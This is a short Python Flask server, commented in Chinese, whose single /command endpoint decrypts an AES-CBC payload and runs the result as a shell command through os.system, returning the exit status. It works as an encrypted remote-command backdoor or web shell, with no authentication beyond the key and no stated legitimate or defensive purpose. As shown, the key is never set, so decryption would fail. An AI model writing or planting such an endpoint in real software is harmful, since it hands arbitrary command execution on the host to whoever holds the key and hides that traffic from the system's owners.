from flask import Flask, request
import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

app = Flask(__name__)

# 加载密钥
key = None  # 全局变量存储密钥

@app.route('/command', methods=['POST'])
def run_command():
    global key

    encrypted_data = request.data

    # 解密命令
    try:
        iv = encrypted_data[:16]
        encrypted_command = encrypted_data[16:]
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
        padded_command = decryptor.update(encrypted_command) + decryptor.finalize()
        command = unpadder.update(padded_command) + unpadder.finalize()
    except Exception as e:
        return f"Decryption failed: {str(e)}", 400

    # 执行解密后的命令
    try:
        result = os.system(command.decode('utf-8'))
        return f"Command executed with result: {result}", 200
    except Exception as e:
        return f"Command execution failed: {str(e)}", 500

def set_key(new_key):
    global key
    key = new_key

if __name__ == "__main__":
    app.run()
